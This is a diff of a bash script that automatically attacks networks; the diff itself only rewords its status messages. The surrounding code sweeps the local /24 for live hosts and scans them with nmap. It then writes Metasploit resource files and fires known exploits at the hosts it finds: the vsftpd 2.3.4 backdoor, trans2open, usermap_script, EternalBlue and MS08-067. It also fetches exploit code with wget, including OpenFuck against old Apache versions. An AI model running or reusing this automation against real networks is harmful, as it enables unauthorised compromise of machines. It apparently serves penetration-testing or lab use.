@@ -37,7 +37,7 @@ fi
 ################################ FTP #################################
 function vsftpd_234_backdoor(){
 	echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mBackdoor command execution\e[0m"
-	echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+	echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 	cat <<- vsftpd_234_backdoor > $(dirname $0)/exploits/ftp/vsftpd_234_backdoor.rc
 		use exploit/unix/ftp/vsftpd_234_backdoor
 		set RHOSTS $ips
@@ -306,7 +306,7 @@ function smbBruteForce(){
 }
 function OpenSSH4_7p1(){
 	echo -e "$ips has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91m brute force attacks against cryptographic keys\e[0m"
-    echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+    echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 	if [ ! -f $(dirname $0)/exploits/ssh/5622.tar.bz2 ]
 	then
 		wget -q -P $(dirname $0)/exploits/ssh/ https://www.exploit-db.com/download/5632
@@ -343,7 +343,7 @@ function OpenSSH4_7p1(){
 ################################ SMB #################################
 function trans2open(){
 	echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow\e[0m"
-	echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+	echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
 	cat <<- trans2open > $(dirname $0)/exploits/smb/trans2open.rc
 		use exploit/linux/samba/trans2open
 		set RHOSTS $ips
@@ -371,7 +371,7 @@ function trans2open(){
 }
 function usermap_script(){
 	echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mcommand execution\e[0m"
-	echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+	echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
 	cat <<- usermap_script > $(dirname $0)/exploits/smb/usermap_script.rc
 		use exploit/multi/samba/usermap_script
 		set RHOSTS $ips
@@ -407,15 +407,15 @@ function ms17_010_eternalblue(){
 	if [ "$smbVersion" != "" ]
 	then
 		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow/remote code execution\e[0m"
-		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
 	elif [ "$smbVersion" = "" ]
 	then
 		smbVersion=$(grep -oP 'key="title">\K[^<]+' $ips/nmapSMBVuln.xml|cut -f6-7 -d' ')
 		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow/remote code execution\e[0m"
-		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
 	else
 		echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow\e[0m"
-		echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 	fi
 	cat <<- ms17_010_eternalblue > $(dirname $0)/exploits/smb/ms17_010_eternalblue.rc
 		use exploit/windows/smb/ms17_010_eternalblue
@@ -463,15 +463,15 @@ function ms08_067_netapi(){
 	if [ "$smbVersion" != "" ]
 	then
 		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mparsing flaw\e[0m"
-		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
 	elif [ "$smbVersion" = "" ]
 	then
 		smbVersion=$(grep -oP 'key="title">\K[^<]+' $ips/nmapSMBVuln.xml|cut -f6-7 -d' ')
 		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mparsing flaw\e[0m"
-		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
 	else
 		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mparsing flaw\e[0m"
-		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in process"
+		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
 	fi
 	cat <<- ms08_067_netapi > $(dirname $0)/exploits/smb/ms08_067_netapi.rc
 		use exploit/windows/smb/ms08_067_netapi
@@ -705,7 +705,7 @@ else
 	fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
 	ips="$(cat $(dirname $0)/online.txt)"
 fi
-echo "Performing a ping sweep is in process"
+echo "Performing a ping sweep is in progress"
 echo -e "Your ip address is \e[1m$ip\e[0m"
 grep -vxFf $(dirname $0)/urIp.txt $(dirname $0)/online.txt > $(dirname $0)/tmp.txt; cat $(dirname $0)/tmp.txt > $(dirname $0)/online.txt; rm $(dirname $0)/tmp.txt
 for ips in $(cat $(dirname $0)/online.txt)
@@ -803,7 +803,7 @@ do
 				if [ "$name" = "http" ] && [ "$product" = "Apache Tomcat/Coyote JSP engine" ] && [ "$version" = "1.1" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mremote code execution\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					port="$(cat $ips/$ips.nmap | grep "Apache Tomcat/Coyote JSP engine"| cut -f1-1 -d/)"
 					if [ -f $(dirname $0)/exploits/apache/tomcat_mgr_login.txt ]
 					then
@@ -858,7 +858,7 @@ do
 				if [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.9" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.9" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
@@ -883,7 +883,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.19" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.19" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
@@ -908,7 +908,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.22" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.22" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
@@ -939,7 +939,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.24" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.24" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -967,7 +967,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.26" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.26" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -993,7 +993,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.27" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.27" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1018,7 +1018,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.6" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.6" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1042,7 +1042,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.14" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.14" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1070,7 +1070,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/2.6.2" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "2.6.2" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1096,7 +1096,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.3" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.3" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1120,7 +1120,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.6" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.6" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1146,7 +1146,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.4" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.4" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1170,7 +1170,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.1.3" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.1.3" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1194,7 +1194,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.12" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.12" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1232,7 +1232,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.20" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.20" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1258,7 +1258,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.22" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.22" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1292,7 +1292,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.23" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.23" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1324,7 +1324,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.9" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.9" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1350,7 +1350,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.19" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.19" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
  
@@ -1377,7 +1377,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.24" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.24" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
  
@@ -1404,7 +1404,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/2.0.40" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "2.0.40" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
  
@@ -1429,7 +1429,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.26" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.26" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
  
@@ -1464,7 +1464,7 @@ do
 				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.27" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.27" ]
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
-					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
+					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
  
